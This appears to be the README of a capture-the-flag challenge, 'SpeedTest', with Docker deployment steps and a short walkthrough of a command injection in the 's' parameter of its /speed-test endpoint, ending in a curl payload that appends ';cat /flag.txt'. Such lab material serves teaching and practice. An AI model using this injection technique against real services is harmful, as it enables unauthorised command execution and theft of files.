# SpeedTest

## Description

Maybe let's do a speedtest?

## Deployment

```sh
git clone https://github.com/aswinmguptha/mwade-challenges/
cd mwade-challenges/Speedtest/src
docker build .
docker run -dp 3000:3000 -p 8081:8081 <docker image id>
```

## Exploit


- /speed-test provides ability to perform speedtest using the “s” get parameter. This endpoint is vulnerable to command injection.


The "s" get parameter is appended to the command without any filters due to which command injection is possible.

To access the endpoint we can use the following curl command:

`curl http://localhost:8081/speed-test?s=server-1`

The application only displays the error messages if any, so to get the output of commands we run we can use backtics(`) to do command injection.

To get the flag we can use the following payload:

```bash
curl "http://localhost:8081/speed-test/?s=server-1;cat /flag.txt"
```
